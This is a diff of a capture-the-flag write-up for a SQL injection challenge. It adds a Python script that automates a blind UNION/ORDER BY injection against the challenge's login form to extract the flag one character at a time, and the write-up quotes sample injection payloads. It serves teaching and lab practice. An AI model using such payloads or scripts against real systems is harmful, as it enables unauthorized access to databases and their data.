@@ -109,14 +109,14 @@ The .fetchone() function will grab the top result in the "ORDER BY" table, so th
 | --- | --- | --- | --- |
 | 0 | x | y | F |
 | 1 | admin | 123456 | F???????? |
-<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/false-result.png" width="300">
+<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/false-result.png" width="700">
 
 The second injected code will return `True` because now, the table is ordered upside down. The first row has the information of the original query and the password is matching with it. Now, we get the message "Nice, you are logged in! But... Where is the flag?".
 | id | username | password | flag |
 | --- | --- | --- | --- |
 | 1 | admin | 123456 | F???????? |
 | 0 | x | y | G |
-<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/true-result.png" width="300">
+<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/true-result.png" width="700">
 
 Sounds confusing, but, with some practice and successful and failed attempts, you will get it.
 
@@ -125,7 +125,58 @@ Moving forward with the testing, it's very probably the beginning of the flag is
 "admin' UNION SELECT 0,'x','y','FLAG{E' ORDER BY 4,1 --" >>> False
 "admin' UNION SELECT 0,'x','y','FLAG{F' ORDER BY 4,1 --" >>> True
 ```
-This means the flag starts with capital "E". We have "FLAG{E" so far.
+This means the flag starts with capital "E". We have "FLAG{E" so far. But, to avoid fatigue and feed our lazyness, let's create a Python script to help us automating the bunch of queries it need to get the complete flag. =D
 
+```Python
+import requests, time
+from concurrent.futures import ThreadPoolExecutor
 
+url = "http://challenge.alguien.site:31337/login"
+success = "Nice, you are logged in! But... Where is the flag?"
+failed = "Sorry, your username or password is bad"
+username = "admin"
+password = "123456"
 
+def check_flag(i):
+	character = chr(i)
+	payload = "admin' union select 0,'x','y','" + flag + character + "' order by 4,1 --"
+	req = requests.post(url, data={"username": payload, "password": password})
+	if success in req.text:
+		return chr(i-1)
+
+def concurrent_reqs():
+	letter = []
+	with ThreadPoolExecutor() as executor:
+		try:
+			threads = executor.map(check_flag,range(33,127))
+			for l in threads:
+				if l is not None:
+					letter.append(l)
+					executor.shutdown(cancel_futures=True)
+		except:
+			pass		
+	return letter[0]
+
+def get_flag():
+	global flag
+	flag = ""
+	while "}" not in flag:
+		flag += concurrent_reqs()
+		print (flag, end="\r", flush=True)
+	return flag
+
+if __name__ == '__main__':
+	start = time.perf_counter()
+	print ("Getting the flag...")
+	print (get_flag())
+	stop = time.perf_counter()
+	print(f"Cracking time - {round(stop - start, 2)} second(s).")
+```
+
+The first function check_flag(i) will receive a number and it will convert it into the ASCII character with the char() function, then, it will append this character to the previous captured flag and send it as a payload in a request to the website. It will return the last failed character in the SQL injection.
+The second function concurrent_reqs() utilize a feature on Python called concurrent.futures, what it does is just to execute the desired function with different argument values at the same time. So, instead of executing it one number by one, it will send all the requests at once.
+The get_flag() function is just getting the correct letter from the functions above and printing the in the same line.
+Finally, the __main__ fucntion is executing the whole code but putting a time benchmark, just to know how many time it gets in guess the flag.
+<img src="https://github.com/stevenvegar/CTF-Writeups-and-Tools/blob/main/HackOrGame/SQLinjection/sqlinjection.png" width="500">
+
+If you want to execute the vulnerable code, just execute the app.py script, modify it to create the database first, then put in the same directory index.html and the folder "templates" which have the same index.html file. It should work properly on localhost.
